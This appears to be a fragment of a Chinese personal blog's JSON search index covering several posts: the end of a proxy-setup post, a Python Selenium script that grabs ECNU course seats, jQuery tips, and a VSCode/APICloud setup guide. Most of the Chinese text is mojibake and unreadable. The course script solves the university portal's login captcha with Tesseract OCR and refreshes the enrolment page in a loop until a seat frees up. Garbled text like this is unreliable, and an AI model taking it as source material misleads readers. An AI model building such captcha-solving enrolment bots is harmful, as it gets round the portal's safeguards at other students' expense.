¡ç½‘ç«™ç”¨ç›´æ¥ç›¸è¿æ¨¡å¼å°±å¥½äº†ï¼Œè¿™æ ·åŒæ—¶å¼€å­¦æ ¡çš„ Anyconnect å’Œé…¸é…¸ä¹³å®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚ auto switch æ˜¯çœŸçš„å¥½ç”¨ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:6:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"2021.10.16 æ›´æ–° ä¿®å¤åšå®¢çš„æ—¶å€™çœ‹åˆ°äº†è¿™ç¯‡æ–‡ç« ã€‚ å¦‚ä»Šé…¸é…¸ä¹³å·²ç»ä¸æ˜¯å¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆäº†ï¼Œæ–°å…´çš„ Trojan åè®®ä¼¼ä¹æ›´èƒœä¸€ç­¹ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:7:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ç”¨æ¥åœ¨ç¬¬ä¸‰è½®é€‰è¯¾ä¸­æŠ¢è¯¾ã€‚ ","date":"2019-02-10","objectID":"/course-robber/:0:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"èƒŒæ™¯ä»‹ç» ä¼—æ‰€å‘¨çŸ¥ï¼ŒECNU å°†é€‰è¯¾åˆ†ä¸ºä¸‰è½®â€”â€”å‰ä¸¤è½®ä¸­ï¼Œæ¯äººæ‹¥æœ‰ 100 æ„æ„¿å€¼ï¼Œå¹¶éœ€è¦å°†æ„æ„¿å€¼åˆç†åœ°åˆ†é…åˆ°æƒ³è¦é€‰æ‹©çš„è¯¾ç¨‹ä¸Šã€‚æ¯è½®ç»“æŸåï¼Œç³»ç»ŸæŒ‰æ„æ„¿å€¼ä¼˜å…ˆçš„è§„åˆ™è¿›è¡Œç­›é€‰ã€‚è€Œåœ¨ç¬¬ä¸‰è½®ï¼Œä¹Ÿå°±æ˜¯æ¥è¿‘å¼€å­¦æ—¶çš„æœ€åä¸€è½®ä¸­ï¼Œç³»ç»Ÿä¼šæŒ‰æ—¶é—´ä¼˜å…ˆçš„è§„åˆ™è¿›è¡Œç­›é€‰ï¼Œå³å…ˆåˆ°å…ˆå¾—ã€‚ä¸æ­¤åŒæ—¶ï¼Œä¸ºäº†é˜²æ­¢ â€œå±¯è¯¾â€ çš„ç°è±¡å‡ºç°ï¼Œç³»ç»Ÿåªä¼šåœ¨ç¬¬ä¸‰è½®é€‰è¯¾æœŸé—´æ¯å¤©ä¸­åˆ 12ï¼š00 æ”¾å‡ºé€€è¯¾åäº§ç”Ÿçš„åé¢ã€‚ æ¯«æ— ç–‘é—®ï¼Œå¯¹äºå‰ä¸¤è½®çš„å€’éœ‰è›‹æ¥è¯´ï¼Œè¦æƒ³åœ¨ç¬¬ä¸‰è½®æœ‰æ‰€æ”¶è·ï¼Œè¿™éƒ¨åˆ†åé¢æä¸ºé‡è¦ã€‚äºæ˜¯è¯¾ç¨‹æ å¤ºè€…è„šæœ¬åº”è¿è€Œç”Ÿã€‚ ","date":"2019-02-10","objectID":"/course-robber/:1:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"æŠ€æœ¯è¦ç‚¹ è„šæœ¬ç”± Python è¯­è¨€ç¼–å†™ï¼Œä¸»è¦ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“ä¸è¾…åŠ©ç¨‹åºæœ‰ï¼š selenium chromedriver.exe Pillow Tesseract-OCR pytesseract retrying ","date":"2019-02-10","objectID":"/course-robber/:2:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"æŠ€æœ¯åŸç† åˆ©ç”¨ selenium + chromedriver æ§åˆ¶ Chrome æµè§ˆå™¨è‡ªåŠ¨æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶è®¿é—® ECNU å…¬å…±æ•°æ®åº“ç™»å½•é¡µé¢ã€‚æ ¹æ®ç”¨æˆ·è¾“å…¥çš„å­¦å·å’Œå…¬å…±æ•°æ®åº“å¯†ç è¿›è¡Œç™»å½•ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªè¡Œæ›´æ”¹ä»£ç å¼€å¤´çš„ä¿¡æ¯æ¥è¿›ä¸€æ­¥ç®€åŒ–æ“ä½œã€‚ç”±äºç™»å½•æ—¶è¦æ±‚è¾“å…¥éªŒè¯ç ï¼Œåˆ©ç”¨ Pillow + Tesseract-OCR + pytesseract åº“ï¼Œå…ˆæ ¹æ®éªŒè¯ç åœ¨ç½‘é¡µä¸­çš„ç›¸å¯¹ä½ç½®æˆªå–å›¾ç‰‡ï¼Œéšåè½¬æ¢ä¸ºç°åº¦å›¾å¹¶ç”¨ ImageEnhance å¢åŠ å›¾ç‰‡å¯¹æ¯”åº¦ï¼Œæœ€åè‡ªåŠ¨è¯†åˆ«å›¾ä¸­çš„éªŒè¯ç å¹¶è¾“å…¥ã€‚ ç™»å½•åä¾æ¬¡ç‚¹å‡»ç›¸åº”çš„é“¾æ¥ã€‚å› ä¸ºåœ¨é€‰è¯¾æœŸé—´å…¬å…±æ•°æ®åº“å“åº”é€Ÿåº¦å¾€å¾€éå¸¸æ…¢ï¼Œè€Œè„šæœ¬ä¸­åˆ©ç”¨ driver çš„é€‰æ‹©å™¨å®šä½è¦ç‚¹å‡»çš„é“¾æ¥ï¼Œæ‰€ä»¥å¦‚æœå“åº”è¿‡æ…¢å°†å‡ºç° NoSuchElementExceptionã€‚æœ€åˆç”¨ time.sleep(è¶³å¤Ÿé•¿çš„æ—¶é—´) ä½œä¸ºè§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯è¿™ä¸€æ—¶é—´å¹¶ä¸å®¹æ˜“è®¾ç½®ã€‚å› æ­¤å¼•å…¥ retrying åº“ï¼Œåˆ©ç”¨ @retry è£…é¥°å™¨ä½¿å¾—å®šä½é“¾æ¥æ—¶ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸å°±ç­‰å¾… 2 ç§’å†é‡è¯•ã€‚è¿™æ ·æ—¢ä¸ä¼šè®©æ¯æ¬¡ç‚¹å‡»ä¹‹å‰éƒ½ç­‰å¾… 2 ç§’ï¼Œåˆèƒ½ä¿è¯åŠ è½½è¿‡æ…¢æ—¶ç¨‹åºä¸è‡³äºå¼‚å¸¸ç»ˆæ­¢ã€‚ æœ€ååˆ™åœ¨é€‰è¯¾ç³»ç»Ÿä¸­é‡å¤è¾“å…¥è¯¾ç¨‹åºå·ï¼ˆæ¥è‡ªç”¨æˆ·è¾“å…¥ï¼‰å¹¶ç‚¹å‡»é€‰è¯¾æŒ‰é’®ï¼Œå¦‚æœæ²¡æœ‰é€‰ä¸Šåˆ™åˆ·æ–°é¡µé¢ï¼Œç›´åˆ°é€‰ä¸Šä¸ºæ­¢ã€‚å¯ä»¥é€šè¿‡å…³é—­è„šæœ¬æ‰“å¼€çš„ Chrome æµè§ˆå™¨ï¼Œæˆ–æ˜¯æŒ‰ä¸‹ \u003cCtrl+C\u003e æ¥ç»ˆæ­¢ç¨‹åºã€‚ ","date":"2019-02-10","objectID":"/course-robber/:3:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"æ³¨æ„äº‹é¡¹ è¿è¡Œå‰è¯·ä¿è¯å·²ç»ä¸‹è½½ chromedriver.exe ä¸”å…¶æ‰€åœ¨è·¯å¾„å·²æ·»åŠ åˆ°ç¯å¢ƒå˜é‡çš„ Path ä¸­ã€‚åŒæ—¶ï¼Œè¯·ä¿è¯å·²ç»å®‰è£… selenium, Pillow, pytesseract, retrying å››ä¸ª Python ç¬¬ä¸‰æ–¹åº“ï¼ˆéƒ½å¯ä»¥é€šè¿‡ pip install å®‰è£…ï¼‰ä»¥åŠ Tesseract-OCR è½¯ä»¶ã€‚ å®‰è£… Tesseract-OCR æ—¶éœ€è¦åœ¨ Path ä¸­æ·»åŠ è½¯ä»¶æ ¹ç›®å½•ï¼Œå¹¶åœ¨ç³»ç»Ÿå˜é‡ä¸­æ·»åŠ  TESSDATA_PREFIX å˜é‡ï¼Œå€¼ä¸ºè½¯ä»¶æ ¹ç›®å½•ä¸‹çš„ tessdata ç›®å½•ã€‚ æœ¬è„šæœ¬æ–‡ä»¶ä»…æ”¯æŒ Chrome æµè§ˆå™¨ã€‚PhantomJS å’Œ Firefox åŒç†ï¼Œåªæ˜¯é©±åŠ¨ç¨‹åºä¸åŒã€‚ ä½¿ç”¨æ—¶ï¼Œæ‰“å¼€å‘½ä»¤è¡Œï¼Œåˆ‡æ¢åˆ° course.py æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œè¿è¡Œ python course.py å¹¶æŒ‰æç¤ºè¾“å…¥ä¿¡æ¯ã€‚éšåå¯ä»¥æœ€å°åŒ–å‘½ä»¤è¡Œå’Œè¢«æ‰“å¼€çš„ Chrome æµè§ˆå™¨ï¼Œè¿›è¡Œå…¶å®ƒå·¥ä½œã€‚ å¯ä»¥ç›´æ¥ä¿®æ”¹ä»£ç å¼€å¤´ my_idã€my_pswdã€my_course_id ä¸‰è¡Œå†…å®¹ä»¥ç®€åŒ–ä½¿ç”¨æµç¨‹ã€‚ ä½¿ç”¨æœ¬è„šæœ¬å¹¶ä¸èƒ½ä¿è¯ç”¨æˆ·æŠ¢åˆ°å¿ƒä»ªçš„è¯¾ç¨‹ã€‚ ","date":"2019-02-10","objectID":"/course-robber/:4:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ä»£ç  from selenium import webdriver from PIL import Image, ImageEnhance import pytesseract from retrying import retry my_id = input('Your ID:') my_pswd = input('Your password:') my_course_id = input('ID of course you need:') # my_id = 'id' # my_pswd = 'password' # my_course_id = 'course id' print('Welcome. Press \u003cCtrl+C\u003e or close the browser to quit.') # chromedriver.exe must be added to PATH driver = webdriver.Chrome() driver.get(\"http://portal.ecnu.edu.cn\") driver.save_screenshot('0.png') codeImage = driver.find_element_by_id('codeImage') img = Image.open('0.png') # Adjust location \u0026\u0026 size for img.crop() left = codeImage.location['x'] * 1.51 top = codeImage.location['y'] * 1.5 right = left + codeImage.size['width'] * 1.3 bottom = top + codeImage.size['height'] * 1.5 img = img.crop((left, top, right, bottom)) img = img.convert('L') img = ImageEnhance.Contrast(img).enhance(3) # Single text line with only numbers my_code = pytesseract.image_to_string(img, config='--psm 7 -c tessedit_char_whitelist=0123456789') driver.find_element_by_id('un').send_keys(my_id) driver.find_element_by_id('pd').send_keys(my_pswd) driver.find_element_by_name('code').send_keys(my_code) driver.find_element_by_class_name('login_box_landing_btn').click() def stop_func(attempts, delay): print('Loading... Attempts: %d, Delay: %d' % (attempts, delay)) @retry(wait_fixed=2000, stop_func=stop_func) def click_edu(): driver.find_element_by_link_text(' æœ¬ç§‘æ•™å­¦').click() def switch_2_new_tag(): driver.switch_to.window(driver.window_handles[-1]) @retry(wait_fixed=2000, stop_func=stop_func) def click_course(): driver.find_element_by_css_selector('li.li_1 a.subMenu').click() @retry(wait_fixed=2000, stop_func=stop_func) def click_choose(): driver.find_elements_by_link_text(' ç‚¹å‡»è¿›å…¥')[2].click() @retry(wait_fixed=2000, stop_func=stop_func) def click_entry(): driver.find_element_by_link_text(' è¿›å…¥é€‰è¯¾\u003e\u003e\u003e\u003e').click() @retry(wait_fixed=2000, stop_func=stop_func) def click_filter(): driver.find_element_by_id('electableLessonList_filter_submit').click() @retry(wait_fixed=2000, stop_func=stop_func) def click_op(): driver.find_element_by_class_name('lessonListOperator').click() click_edu() switch_2_new_tag() click_course() click_choose() click_entry() switch_2_new_tag() while True: try: # An exception will occur if user closes the browser driver.find_element_by_name('electableLesson.no').send_keys(my_course_id) except: break click_filter() click_op() al = driver.switch_to.alert if al.text == 'ä¸Šé™äººæ•°å·²æ»¡ï¼Œè¯·ç¨åå†è¯•': al.accept() print('Refreshing...') driver.refresh() continue else: al.accept() print('Success!') break ","date":"2019-02-10","objectID":"/course-robber/:5:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"é™„å½• TODO: å­˜å‚¨ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯ï¼Œä½¿ç”¨æˆ·ä¸ç”¨ä¿®æ”¹ä»£ç ä¹Ÿèƒ½ä¸€åŠ³æ°¸é€¸ã€‚è¿™æ¶‰åŠåˆ°å¯†ç å­˜å‚¨çš„é—®é¢˜â€”â€”ä¸èƒ½ç›´æ¥å­˜å‚¨æ˜æ–‡ï¼Œæ‰€ä»¥éœ€è¦åŠ å¯†æœºåˆ¶ã€‚é‡‡ç”¨ base64 ä¹‹ç±»çš„ç¼–ç ç­‰äºæ²¡åŠ å¯†ï¼Œé‡‡ç”¨å•å‘æ•£åˆ—å‡½æ•°åˆ™æ— æ³•è¿˜åŸæˆå¯†ç æ˜æ–‡ï¼Œå¿…é¡»ç”¨åŒå‘çš„ï¼ˆä¹Ÿå°±æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„ï¼‰åŠ å¯†æœºåˆ¶ï¼Œç”±äºæ•°æ®é‡ä¸å¤§ï¼ŒDES, 3DES, AES, RSA éƒ½æ˜¯å€¼å¾—è€ƒè™‘çš„é€‰æ‹©ã€‚é—®é¢˜æ˜¯æˆ‘çœŸçš„éœ€è¦æŠŠè¿™ä¸ªç®€å•çš„è„šæœ¬å¤æ‚åŒ–å—ï¼Ÿ è™½ç„¶ PIL è¢« Pillow æ·˜æ±°äº†ï¼Œç”¨çš„æ—¶å€™è¿˜æ˜¯è¦ from PIL import ...ã€‚ webdriver çš„é€‰æ‹©å™¨å’Œ DOM çš„ document.queryselector å¾ˆåƒï¼Œä¼˜åŠ¿åœ¨äºæ›´çµæ´»ï¼Œç”šè‡³å¯ä»¥ç”¨ xpathï¼ŒåŠ£åŠ¿å˜›â€¦â€¦ æ²¡æœ‰ jQuery äº†ã€‚ è°ƒæ•´è£å‰ªå›¾ç‰‡æ—¶ç”¨äº† location å’Œ sizeï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨ç½‘é¡µä¸Šå’Œåœ¨æˆªå›¾é‡Œæ•°å€¼ä¸Šä¼šæœ‰åå·®ï¼Œæœ€åé ä¹±è°ƒå‚æ•°æ‰æå®šã€‚ã€‚ä¹Ÿè®¸æ˜¯å·§åˆï¼Œæ•°å€¼ä¸Šæ­£å¥½å·®äº† 1.5 å€ï¼Ÿ é™¤äº†ç”¨ ImageEnhance åº“å¢åŠ éªŒè¯ç æ­£ç¡®è¯†åˆ«ç‡ä»¥å¤–ï¼Œè¿˜å¯ä»¥ç”¨å›¾åƒäºŒå€¼åŒ–çš„åŠæ³•ã€‚ç†è®ºä¸Šæ¥è¯´ç”¨ pytesseract æ¥è¯†åˆ« ECNU å…¬å…±æ•°æ®åº“çš„éªŒè¯ç å®åœ¨æ˜¯æ€é¸¡ç”¨ç‰›åˆ€äº†ã€‚ ä¸æ˜ç™½ pytesseract çš„ config é‡Œçš„å‚æ•°çš„å«ä¹‰ï¼Œåœ¨ç½‘ä¸Šç²—ç•¥æ‰¾äº†æ‰¾æ²¡å•¥å‘ç°ï¼Œå‘½ä»¤è¡Œé‡Œæ•² --help å°±å‡ºç°äº†ã€‚è¿˜æ˜¯æ²¡æœ‰å…»æˆå‘½ä»¤è¡Œçœ‹å®˜æ–¹æ–‡æ¡£çš„ä¹ æƒ¯ã€‚ å…³é—­æµè§ˆå™¨æ—¶ä¼šåœ¨æœ€åçš„ while True å¾ªç¯ç¬¬ä¸€è¡Œè§¦å‘ NoSuchWindowExceptionï¼Œæ¯•ç«Ÿæµè§ˆå™¨éƒ½è¢«å…³äº†å˜›ã€‚æ‰€ä»¥é¢å¤–åŠ äº†ä¸ª try...exceptã€‚ ","date":"2019-02-10","objectID":"/course-robber/:6:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"æ¨ªè¡Œéœ¸é“ï¼šECNU ç¬¬ä¸‰è½®è¯¾ç¨‹æ å¤ºè€…","uri":"/course-robber/"},{"categories":["å‰ç«¯"],"content":"å¼€å‘é¡¹ç›®æ—¶è¸©åˆ°çš„å‘ã€‚ ","date":"2019-01-23","objectID":"/jquery/:0:0","tags":["Javascript"],"title":"jQuery è¸©å‘è®°","uri":"/jquery/"},{"categories":["å‰ç«¯"],"content":"åŒ…å« jQuery åº“ å¯ä»¥ä¸‹è½½åˆ°é¡¹ç›®ç›®å½•é‡Œé€šè¿‡ç›¸å¯¹è·¯å¾„è°ƒç”¨ï¼Œä¸è¿‡æˆ‘æ›´åå‘äºé€šè¿‡ cdn æ¥åŒ…å«è¿™äº›å¼€æºåº“ï¼š \u003cscript src=\"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\"\u003e\u003c/script\u003e ","date":"2019-01-23","objectID":"/jquery/:1:0","tags":["Javascript"],"title":"jQuery è¸©å‘è®°","uri":"/jquery/"},{"categories":["å‰ç«¯"],"content":"æ–°å¢å…ƒç´  click äº‹ä»¶ å¯¹äºé€šè¿‡ js æ–°å¢åŠ åˆ° html ä¸­çš„å…ƒç´ ï¼ŒjQuery åŸæ¥çš„ é€‰æ‹©å™¨. click() ä¼šå¤±æ•ˆã€‚ è§£å†³æ–¹æ³•æ˜¯é‡‡ç”¨ .on() æ–¹æ³•ç»‘å®šåˆ° bodyã€‚ä¾‹å¦‚ï¼š $(document).on('click', '.exp', function() {...}); å°±ç›¸å½“äºåŸæ¥çš„ $('.exp').click(function() {...});ã€‚ ","date":"2019-01-23","objectID":"/jquery/:2:0","tags":["Javascript"],"title":"jQuery è¸©å‘è®°","uri":"/jquery/"},{"categories":["å‰ç«¯"],"content":"ajax å‘é€è¡¨å•æ•°æ® å‘é€è¡¨å•æ•°æ®ï¼ˆFormDataï¼‰æ—¶ï¼Œéœ€è¦å°† processData å’Œ contentType è®¾ç½®ä¸º falseï¼Œå¦åˆ™æ— æ³•æ­£ç¡®ä¼ è¾“ã€‚ $.ajax({ method: 'POST', url: url, dataType: 'JSON', data: fData, cache: false, processData: false, contentType: false, ... }); ","date":"2019-01-23","objectID":"/jquery/:3:0","tags":["Javascript"],"title":"jQuery è¸©å‘è®°","uri":"/jquery/"},{"categories":["å‰ç«¯"],"content":"ajax å¼‚æ­¥ä¿®æ”¹å˜é‡å€¼ ç”±äº ajax å‘é€å¼‚æ­¥è¯·æ±‚ï¼ˆç›¸å½“äºå¹¶è¡Œè¯·æ±‚ï¼‰ï¼Œåœ¨ ajax çš„ success æ–¹æ³•é‡Œæƒ³è¦ä¿®æ”¹å˜é‡çš„å€¼æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚å¦‚æœæƒ³è¦ä¿®æ”¹å˜é‡å€¼ï¼Œä¸€èˆ¬éƒ½ä¼šè®¾ç½® async: false æ¥å¼ºåˆ¶å‘é€åŒæ­¥è¯·æ±‚ï¼Œä½†è¿™æ ·ä¹Ÿå°±è®© ajax å¤±å»äº†æ„ä¹‰ã€‚ é€€è€Œæ±‚å…¶æ¬¡çš„åŠæ³•æ˜¯ï¼Œåœ¨ ajax é‡Œåªä¿®æ”¹å…¨å±€å˜é‡ï¼Œå¹¶ä¸”æ¨è¿Ÿä½¿ç”¨è¢«ä¿®æ”¹å˜é‡çš„å€¼ã€‚ ","date":"2019-01-23","objectID":"/jquery/:4:0","tags":["Javascript"],"title":"jQuery è¸©å‘è®°","uri":"/jquery/"},{"categories":["å‰ç«¯"],"content":"é€šè¿‡å¾ªç¯ç»‘å®š click äº‹ä»¶ è¿™é‡Œä¼šé‡åˆ°çš„é—®é¢˜æ˜¯ï¼Œæ‰€æœ‰çš„ click äº‹ä»¶éƒ½è¢«ç»‘å®šåˆ°äº†æœ€åç»‘å®šçš„é‚£ä¸ªå‡½æ•°ä¸Šã€‚åŸå› æ˜¯ js ä¸­çš„å‡½æ•°éƒ½æ˜¯åœ¨è°ƒç”¨æ—¶æ‰è¢«è§£æçš„ã€‚é€šè¿‡æŸ¥é˜… èµ„æ–™ï¼Œå¾—åˆ°çš„è§£å†³æ–¹æ³•ä¹‹ä¸€æ˜¯é‡‡ç”¨ .each() æ–¹æ³•ï¼š $('img').each(function (index) { $(this).click(function () { //... }); } è¿™é‡Œçš„å‚æ•° index è¡¨ç¤ºç¬¦åˆé€‰æ‹©å™¨è§„åˆ™çš„å…ƒç´ çš„ç´¢å¼•ã€‚ä¾‹å¦‚æœ¬ä¾‹ä¸­ï¼Œåœ¨å¯¹åº” html ä¸­çš„ç¬¬ 3 ä¸ª \u003cimg\u003e æ ‡ç­¾ï¼Œå…¶ index å€¼å°±ä¸º 2ã€‚è¦å¼•ç”¨ç´¢å¼•ä¸º index çš„å…ƒç´ ï¼Œåœ¨è¿™é‡Œåªéœ€è¦ $('img').eq(index) å³å¯ã€‚ ","date":"2019-01-23","objectID":"/jquery/:5:0","tags":["Javascript"],"title":"jQuery è¸©å‘è®°","uri":"/jquery/"},{"categories":["å‰ç«¯"],"content":"ä¸æ˜¯å¾ˆæ‡‚ä¸ºä»€ä¹ˆ APICloud æ²¡æœ‰å®˜æ–¹çš„ VSCode æ’ä»¶ã€‚ åœ¨ APICloud ä¸Šè¿›è¡Œå¼€å‘æ—¶ï¼Œæœ‰å¾ˆå¤šä»£ç ç¼–è¾‘å™¨å¯ä»¥é€‰æ‹©ï¼šAPICloud Studio, Sublime Text, Atom, Eclipse ç­‰ç­‰ï¼Œå¯¹äºè¿™äº›å·¥å…·ï¼ŒAPICloud éƒ½æä¾›äº†å®˜æ–¹çš„æ’ä»¶ä»¥æ–¹ä¾¿å¼€å‘ä¸è°ƒè¯•ã€‚ç„¶è€Œï¼Œæˆ‘æœ€å–œæ¬¢çš„ç¼–è¾‘å™¨ VSCode å´æ²¡æœ‰è¿™æ ·çš„å¾…é‡ã€‚å¥½åœ¨ è¿™é‡Œ æä¾›äº†è¿™æ ·çš„æ’ä»¶ï¼Œå°½ç®¡å®ƒæœ‰è¯¸å¤šç‘•ç–µã€‚ ","date":"2019-01-17","objectID":"/vscode-apicloud/:0:0","tags":["VSCode"],"title":"VSCode + APICloud + GitHub å¼€å‘ç¯å¢ƒé…ç½®","uri":"/vscode-apicloud/"},{"categories":["å‰ç«¯"],"content":"æ’ä»¶é…ç½® æŒ‰ä¸Šè¿°é“¾æ¥è£…å¥½æ’ä»¶åï¼Œåœ¨ APICloud äº‘ç«¯åˆ›å»ºä¸€ä¸ª appï¼Œå°±èƒ½å¾—åˆ°ä¸€ä¸ª IDï¼Œè¿™ä¸ª ID åœ¨éƒ¨ç½² GitHub æ—¶ä¼šç”¨åˆ°ã€‚ åœ¨æœ¬åœ°æ–°å»ºä¸€ä¸ªé¡¹ç›®çš„ç›®å½•ï¼Œç”¨ VSCode çš„æ–‡ä»¶ -\u003e æ‰“å¼€æ–‡ä»¶å¤¹å‘½ä»¤æ‰“å¼€è¿™ä¸ªç›®å½•ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸€æ­¥ï¼Œåœ¨åé¢æ–°å»ºé¡¹ç›®æ—¶å°±ä¼šå‡ºé”™ã€‚ éšåå°±å¯ä»¥ Ctrl+Shift+P å¹¶è¾“å…¥ apicloudï¼Œé€‰æ‹©ç›¸åº”çš„å‘½ä»¤äº†ã€‚ä¾‹å¦‚å¯ä»¥æ–°å»ºä¸€ä¸ªé¡¹ç›®æ¨¡æ¿ï¼Œéšååœ¨ç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ªæ–°çš„ç›®å½• HelloAPICloudï¼ŒåŒ…å«äº†é¡¹ç›®æ¨¡æ¿çš„æ‰€æœ‰æ–‡ä»¶ã€‚ ","date":"2019-01-17","objectID":"/vscode-apicloud/:1:0","tags":["VSCode"],"title":"VSCode + APICloud + GitHub å¼€å‘ç¯å¢ƒé…ç½®","uri":"/vscode-apicloud/"},{"categories":["å‰ç«¯"],"content":"Wifi çœŸæœºè°ƒè¯• åœ¨è¿›è¡ŒçœŸæœºè°ƒè¯•å‰ï¼Œé¦–å…ˆéœ€è¦åšä¸€äº›é…ç½®ã€‚è¿™ä¸ªæ’ä»¶æœ€å¤§çš„ç‘•ç–µå°±åœ¨è¿™é‡Œã€‚ æ–‡ä»¶ -\u003e é¦–é€‰é¡¹ -\u003e è®¾ç½® -\u003e æ‰©å±• -\u003eAPICloud ä¸­å°±èƒ½è¿›è¡Œé…ç½®ï¼Œé¦–å…ˆæ˜¯ç«¯å£å·ï¼Œé»˜è®¤æ˜¯ 23456ï¼Œå¯ä»¥ä¸ç”¨æ”¹ï¼›åä¸¤ä¸ªé€‰é¡¹éšæ„ï¼Œæœ€å¤§çš„å‘ç‚¹åœ¨æœ€åï¼Œä¸€å¼ å›¾å°±èƒ½è¯´æ˜äº†ï¼š å›¾ 1 \" å›¾ 1 å› ä¸ºæˆ‘ä»¬åé¢è¦éƒ¨ç½²åˆ° GitHubï¼Œæ‰€ä»¥æˆ‘å…ˆæŠŠæ‰€æœ‰æ–‡ä»¶è½¬ç§»åˆ°äº†æ–°å»ºçš„ widget ç›®å½•ï¼Œå¹¶åˆ é™¤äº†åŸæ¥çš„ HelloAPICloud ç›®å½•ã€‚éšåï¼Œå½“æˆ‘åœ¨è¿™ä¸€æ è¾“å…¥ /widget å¹¶å¯åŠ¨ wifi å…¨é‡æ›´æ–°æ—¶ï¼Œæ§åˆ¶å°å´æé†’æˆ‘å½“å‰ç›®å½•ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ APICloud é¡¹ç›®ã€‚è¿™é‡Œæ˜¾ç¤ºçš„å½“å‰ç›®å½•ï¼Œå¹¶ä¸æ˜¯ widget ç›®å½•ï¼Œè€Œæ˜¯å®ƒçš„ä¸Šä¸€çº§ï¼Œä¹Ÿå°±æ˜¯é¡¹ç›®ç›®å½•ã€‚ è¿™å°±æ˜¯è¯´ï¼Œæˆ‘æ·»åŠ çš„è¿™ä¸ªè·¯å¾„æ²¡æœ‰è¢«æ­£ç¡®è¯†åˆ«ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿçœ‹ä¸Šå›¾å°±æ˜ç™½äº†ï¼ŒWindows ä¸‹æ˜¯ä½¿ç”¨ \\ è€Œä¸æ˜¯ / æ¥è¡¨ç¤ºç›®å½•çš„ï¼ˆåè€…æ˜¯ Linux çš„ä¹ æƒ¯ï¼‰ï¼Œè€Œåœ¨è¿™ä¸€å­—æ®µçš„æç¤ºä¸­ï¼Œå´åˆ†æ˜å†™ç€ï¼š æ”¾åˆ°æ ¹ç›®å½•çš„ â€˜/widgetâ€™ é‡Œ â€¦â€¦ å¦‚ä¸Šå›¾ä¸€èˆ¬é…ç½®åï¼Œå…ˆåœ¨å³é”®èœå•ä¸­å¯åŠ¨ Wifi æœåŠ¡ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæ‰‹æœºä¸Šåº”å·²è£…å¥½ AppLoaderï¼Œå¹¶é…ç½®å¥½ç«¯å£å·å’Œ IP åœ°å€ã€‚å…¶ä¸­ï¼Œç«¯å£å·æ¥è‡ªåˆšæ‰çš„é…ç½®ï¼Œé»˜è®¤æ˜¯ 23456ï¼›IP åœ°å€çš„è¯åœ¨å¯åŠ¨ Wifi æœåŠ¡åçš„æ§åˆ¶å°é‡Œå°±å¯ä»¥çœ‹åˆ°ã€‚å¦‚æœæœ‰å¤šä¸ª IP åœ°å€ï¼Œå¡«ä»¥ 192.168 å¼€å¤´çš„é‚£ä¸ªåœ°å€ï¼ˆæˆ–å…¶å®ƒå†…ç½‘åœ°å€ï¼‰ã€‚ è¿™æ ·ä»¥åå†è¿›è¡Œ Wifi å…¨é‡æ›´æ–°æˆ– Wifi å¢é‡æ›´æ–°ï¼Œæ‰‹æœºä¸Šé—ªè¿‡ä¸€æ®µè¿›åº¦æ¡åï¼Œå°±å¯ä»¥çœ‹åˆ° app çš„ç•Œé¢äº†ã€‚ å…³äºè¿™ä¸ªæ’ä»¶çš„å…¶å®ƒåŠŸèƒ½æˆ‘è¿˜åœ¨ç ”ç©¶ä¸­ã€‚ ","date":"2019-01-17","objectID":"/vscode-apicloud/:2:0","tags":["VSCode"],"title":"VSCode + APICloud + GitHub 